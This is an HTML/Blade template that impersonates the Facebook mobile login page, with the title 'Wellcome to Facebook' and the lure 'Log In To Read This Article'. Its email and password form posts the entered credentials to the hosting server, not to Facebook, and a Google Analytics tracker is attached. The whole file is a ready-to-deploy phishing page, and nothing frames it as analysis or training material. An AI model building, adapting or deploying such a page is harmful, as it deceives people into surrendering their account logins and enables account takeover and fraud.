
<!DOCTYPE html>
<html lang="vi" id="facebook">
<head>
    <meta charset="utf-8"/>
    <script src="https://code.jquery.com/jquery-2.2.2.min.js"></script>
    <title id="pageTitle">Wellcome to Facebook</title>
    <link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico"/>
</head>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-83849939-1', 'auto');
  ga('send', 'pageview');

</script>
<meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no"/>
<link href="https://static.xx.fbcdn.net/rsrc.php/v2/ya/r/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed"
      sizes="196x196"/>
 <meta name="referrer" content="no-referrer" />
<meta name="referrer" content="unsafe-url" />
<meta name="referrer" content="origin" />
<meta name="referrer" content="no-referrer-when-downgrade" />
<meta name="referrer" content="origin-when-cross-origin" />
<link rel="stylesheet" type="text/css" id="nwLNW" href="/css/app.css"/>
<script type="text/javascript">
    $("#mesbox").hide();
</script>
<script id="u_0_c">(function _(a, b, c, d) {
    if (!a) {
        document.cookie = b + '=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
        document.cookie = c + '=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
        return;
    }
    var e = null;
    if (navigator.userAgent.indexOf('Firefox') !== -1 || (!window.devicePixelRatio && navigator.userAgent.indexOf('Windows Phone') !== -1)) {
        e = screen.width / document.documentElement.offsetWidth;
        e = Math.max(1, Math.floor(e * 2) / 2);
    }
    if ((!e || e === 1) && navigator.userAgent.indexOf('IEMobile') !== -1) {
        e = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96;
        e = Math.max(1, Math.round(e * 2) / 2);
    }
    document.cookie = b + '=' + (e || window.devicePixelRatio || 1);
    var f = window.screen ? screen.width : 0, g = window.screen ? screen.height : 0;
    document.cookie = c + '=' + f + 'x' + g;
    if (d && document.cookie && window.devicePixelRatio > 1)document.location.reload();
})(true, "m_pixel_ratio", "wd", false);</script>
</head>
<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
<br><br>

<div id="root" role="main" class="_5soa acw" data-sigil="context-layer-root content-pane" style="min-height: 640px;">
 <div class="_5b_f" style="text-align: center; color: rgb(20, 24, 35); font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande', tahoma, verdana, arial, sans-serif; font-size: 16px; line-height: 18px;">
      <!--     <img alt="" class="mhs _5b_g img" height="70" src="http://i.imgur.com/TCMtWNK.png" style="border-top-left-radius: 7px; border-top-right-radius: 7px; border-bottom-right-radius: 7px; border-bottom-left-radius: 7px; -webkit-box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 1px; display: inline-block; height: 70px; width: 70px;" width="70" /> -->
          <div class="uiScaledImageContainer mhs _5b_g" style="border-top-left-radius: 7px; border-top-right-radius: 7px; border-bottom-right-radius: 7px; border-bottom-left-radius: 7px; -webkit-box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 1px; display: inline-block; height: 70px; width: 70px;">
            <img alt="" class="scaledImageFitWidth img" height="70" itemprop="image" src="/img/fb-art.png" style="width: 70px;" width="70" /></div>
        </div>
        <div class="_5b_h" style="margin: 15px auto 0px; text-align: center; width: 300px; color: rgb(20, 24, 35); font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande', tahoma, verdana, arial, sans-serif; font-size: 13px; line-height: 18px;">
       <h2>   <span class="fwb">Log In To Read This Article</span></div></h2>


<script id="u_0_4">(function (a) {
    a.__updateOrientation = function () {
        var b = (!!a.orientation && a.orientation !== 180), c = document.body;
        if (c)c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, ' ') + ' ' + (b ? 'landscape' : 'portrait');
        return b;
    };
})(window);</script>

<div id="viewport"><h1
        style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
    <div id="page">
        <div class="_129_"></div>

        <div class="error" id= "mesbox" style="display:none;background:#dc3847;color:white;font-size:14px;padding:8px;"><p id="message"> </p>
        </div>

        <div id="root" role="main" class="_5soa acw" data-sigil="context-layer-root content-pane">
            <div class="_4g33">
                <div class="_4g34">
                    <div class="aclb _5rut">

                            <div class="_56be _5sob" style="
    padding-top: 0px;
    border-top-width: 5px;
    margin-top: 5px;
    top: 15px;
">

 <form action="/" method="POST">
 {{ csrf_field() }}
                                <div class="_55wo _55x2 _56bf"><input type="email" autocorrect="off" autocapitalize="off"
                                                                      class="_56bg _55ws _5ruq" name="email"
                                                                      placeholder="Email" type="text" id="email" required />


                                    <input autocorrect="off" autocapitalize="off" class="_56bg _55ws _5ruq"
                                           placeholder="Password" name="password" type="password"
                                           data-sigil="password" id="passsword" required/>
                                    <div class="_55ws" >
                                        <button type="submit" value="Log in" class="_56bs _56b_ _56bw _56bu"
                                                name="login" id="u_0_1" o data-sigil="touchable"><span class="_55sr">Login Facebook</span>
                                        </button>
                                    </div>
                                    </form>
                                </div>
                            </div>
                            <noscript><input type="hidden" name="_fb_noscript" value="true"/></noscript>

                            <div class="_52jj _5t3b"><a class="_56bs _5t3b _56bw _56bv"
                                                        data-store="&#123;&quot;nativeClick&quot;:true&#125;"
                                                        role="button" data-sigil="touchable"><span class="_55sr"> Create new account</span></a>
                            </div>
                            <div class="other-links">
                                <ul class="_5pkb _55wp">
                                    <li><span class="mfss fcg"><a
                                            href="#">Forget
                                        password?</a><span aria-hidden="true"> - </span><a class="sec"
                                                                                           href="#">Help</a></span>
                                    </li>
                                    <li></li>
                                </ul>
                            </div>
                    </div>
                </div>
            </div>
            <div class="_55wr _5ui2">
                <div class="_5dpw">
                    <div class="_5ui3" data-sigil="marea"><a class="sec"
                                                            href="#"
                                                            data-ajaxify-href="#"
                                                            data-sigil="ajaxify"><b>English (US)</b></a><span
                            aria-hidden="true"> - </span><a class="sec"
                                                            href="#"
                                                            data-ajaxify-href="#"
                                                            data-sigil="ajaxify">English (UK)</a><span
                            aria-hidden="true"> - </span><a class="sec"
                                                            href="#">More
                        Languages...</a></span></div>
                    <div class="_5ui4"><span class="mfss fcg">Facebook - 2017</span></div>
                </div>
            </div>
        </div>
        <div class="viewportArea _2v9s" id="u_0_2" style="display:none" data-sigil="marea">
            <div class="_5vsg" id="u_0_d"></div>
            <div class="_5vsh" id="u_0_e"></div>
            <div class="_5v5d fcg">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1"
                     data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                Loading...
            </div>
        </div>
        <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
            <div class="container">
                <div class="image"></div>
                <div class="message" data-sigil="error-message"></div>
                <a class="link" data-sigil="MPageError:retry">Try Again</a></div>
        </div>
    </div>
</div>
<div id="static_templates">
    <div class="mDialog" id="modalDialog" style="display:none">
        <div class="_52z5 mFuturePageHeader firstStep titled" id="mDialogHeader">
            <table>
                <tr>
                    <td class="_52z7">
                        <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable"
                                data-sigil="dialog-cancel-button blocking-touchable">Cancel
                        </button>
                        <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly"
                                aria-label="Back" data-sigil="dialog-back-button blocking-touchable"><i
                                class="img sp_7c4PVPhfMg5 sx_ef54f0" style="margin-top: 4px;"></i></button>
                    </td>
                    <td class="_52z6">
                        <div class="mFuturePageHeaderTitle mfsl fcw" id="m-future-page-header-title"
                             data-sigil="dialog-title">Loading...
                        </div>
                    </td>
                    <td class="_52z8" id="modalDialogHeaderButtons"></td>
                </tr>
            </table>
        </div>
        <div class="modalDialogView" id="modalDialogView"></div>
        <div class="_5v5d _5v5e fcg" id="dialogSpinner">
            <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_3"
                 data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
            Loading...
        </div>
    </div>
</div>

</body></html><style type="text/css">
[touch-action="none"] {
            -ms-touch-action: none;
            touch-action: none;
        }

        [touch-action="pan-x"] {
            -ms-touch-action: pan-x;
            touch-action: pan-x;
        }

        [touch-action="pan-y"] {
            -ms-touch-action: pan-y;
            touch-action: pan-y;
        }

        [touch-action="scroll"], [touch-action="pan-x pan-y"], [touch-action="pan-y pan-x"] {
            -ms-touch-action: pan-x pan-y;
            touch-action: pan-x pan-y;
        }  </style>
